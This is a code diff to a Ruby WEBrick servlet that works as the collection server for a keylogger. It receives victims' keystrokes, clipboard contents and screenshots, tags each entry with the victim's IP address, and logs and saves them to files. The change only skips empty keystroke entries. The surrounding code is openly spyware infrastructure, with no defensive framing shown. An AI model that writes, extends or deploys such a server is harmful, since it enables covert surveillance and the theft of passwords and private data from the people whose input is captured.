@@ -40,8 +40,10 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
       screenshot_base64 = data['screenshot'] || ''
 
       victim_ip = request.peeraddr.last # Retrieve the IP Address of the victim as an Identifier
-      
-      @logger.info("Received Keystrokes from #{victim_ip}: #{keyboard_data}") # Log received keystrokes
+
+      if !keyboard_data.empty?
+         @logger.info("Received Keystrokes from #{victim_ip}: #{keyboard_data}") # Log received keystrokes
+      end
 
       if @show_clipboard_in_logs && !clipboard_data.empty?
          @logger.info("Received Clipboard Data from #{victim_ip}: #{clipboard_data}") # Log received clipboard data
@@ -53,7 +55,7 @@ class MyServlet < WEBrick::HTTPServlet::AbstractServlet
       end
 
       # Save the captures to the txt files
-      save_to_file(@keystrokes_file_path, "#{victim_ip}: #{keyboard_data}")
+      save_to_file(@keystrokes_file_path, "#{victim_ip}: #{keyboard_data}") unless keyboard_data.empty?
       save_to_file(@clipboard_file_path, "#{victim_ip}: #{clipboard_data}") unless clipboard_data.empty?
       
       response.status = 200
